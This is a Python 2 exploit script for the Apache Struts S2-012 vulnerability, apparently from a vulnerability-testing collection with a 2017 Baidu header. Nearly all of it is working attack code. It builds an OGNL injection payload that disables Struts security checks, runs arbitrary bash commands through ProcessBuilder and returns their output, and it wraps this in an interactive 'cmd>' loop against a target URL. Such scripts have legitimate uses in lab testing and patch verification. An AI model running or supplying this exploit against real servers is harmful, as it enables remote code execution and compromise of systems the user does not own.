##############################################################################
#
# Copyright (c) 2017 Baidu.com, Inc. All Rights Reserved
#
##############################################################################
"""
struts s2-012 exploit


Date: 2017/06/26 17:10:00
"""
#!/usr/bin/python
# -*- coding: utf-8 -*-

import re
import ssl
import sys
import httplib
import urllib
import urllib2
import fileinput

PATTERN = re.compile(r'<input type="text" name="age" value="([^"]*)" id="user_age"/>')


def _run(url, cmd):
    url += '/user.action'
    try:
        payload = ''
        payload += '''%{(#context['xwork.MethodAccessor.denyMethodExecution']=false)'''
        payload += '''(#_memberAccess['allowStaticMethodAccess']=true)'''
        payload += '''(#cmd="%s").''' % cmd
        payload += '''(#cmds={"/bin/bash","-c",#cmd}).'''
        payload += '''(#p=new java.lang.ProcessBuilder(#cmds)).'''
        payload += '''(#p.redirectErrorStream(true)).(#process=#p.start()).'''
        payload += '''(#ros=(@org.apache.struts2.ServletActionContext@getResponse().'''
        payload += '''getOutputStream())).'''
        payload += '''(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).'''
        payload += '''(#ros.flush())}'''

        data = urllib.urlencode({'name': payload})

        headers = {'User-Agent': 'Mozilla/5.0'}
        request = urllib2.Request(url, data=data, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead as e:
        page = e.partial

    print page

if __name__ == "__main__":
    url = 'http://localhost:8080/S2-012' if len(sys.argv) == 1 else sys.argv[1]
    print 'URL=' + url

    while True:
        try:
            line = raw_input("cmd> ").strip()
            if line == 'exit':
                sys.exit()
            _run(url, line)
        except EOFError:
            print "\n"
            sys.exit()
        except Exception as e:
            print e
